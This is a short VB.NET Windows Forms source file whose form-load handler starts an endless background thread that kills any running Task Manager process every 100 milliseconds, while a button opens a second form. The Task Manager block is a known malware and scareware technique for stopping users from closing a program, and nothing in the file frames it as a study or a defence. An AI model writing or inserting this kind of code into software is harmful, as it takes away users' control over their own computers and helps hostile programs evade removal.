Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim T As New Threading.Thread(AddressOf Block)
        T.Start()
    End Sub
    Sub Block()
        While True
            For Each P As Process In Process.GetProcessesByName("taskmgr")
                P.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Form2.Show()
    End Sub
End Class
